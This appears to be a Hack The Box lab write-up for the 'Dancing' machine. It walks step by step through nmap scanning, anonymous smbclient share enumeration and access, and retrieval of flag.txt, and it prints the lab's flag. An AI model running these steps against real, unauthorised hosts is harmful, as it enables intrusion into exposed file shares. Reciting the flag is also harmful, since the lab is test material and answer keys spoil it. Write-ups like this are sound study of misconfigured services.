HTB Writeup – SMB Lab (Dancing)
Date:07-04-2026
https://labs.hackthebox.com/achievement/machine/3347199/395
🔍 Overview
•	Platform: Hack The Box (Starting Point)
•	Difficulty: Easy
•	Objective: Enumerate SMB shares and retrieve the flag
🌐 Target Information
•	Target IP: 10.129.51.50
🧪 Step 1: Connectivity Check
Command:
ping 10.129.51.50
Result:
•	Host is reachable
•	Some packet loss observed (normal in VPN environments)
🧪 Step 2: Nmap Scan
Command:
nmap -sV 10.129.51.50
Result:
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
5985/tcp open  http
Analysis:
•	Presence of port 445 (SMB) indicates file sharing service
•	Target is a Windows machine
📂 Step 3: SMB Enumeration
List available shares:
smbclient -L //10.129.51.50
Result:
•	ADMIN$
•	C$
•	IPC$
•	WorkShares ✅
🔐 Step 4: Access SMB Share
Command:
smbclient //10.129.51.50/WorkShares
👉 Press Enter for password (blank login)
📁 Step 5: Directory Enumeration
Command:
ls
Result:
•	Amy.J (directory)
•	James.P (directory)

📂 Step 6: Navigate Directory
Command:
cd James.p
ls
Result:
•	flag.txt found
📥 Step 7: Download File
Command:
get flag.txt
🏁 Step 8: Extract Flag
Exit SMB and run:
cat flag.txt
Flag:
5f61c10dffbc77a704d76016a22f1664

💡 Key Learnings
•	SMB enumeration using smbclient
•	Identifying accessible shares
•	Anonymous/blank password access vulnerability
•	Importance of proper command usage inside SMB shell
🧠 Conclusion
This lab demonstrated how misconfigured SMB shares with anonymous access can lead to sensitive data exposure. Proper enumeration and navigation allowed retrieval of the flag successfully.


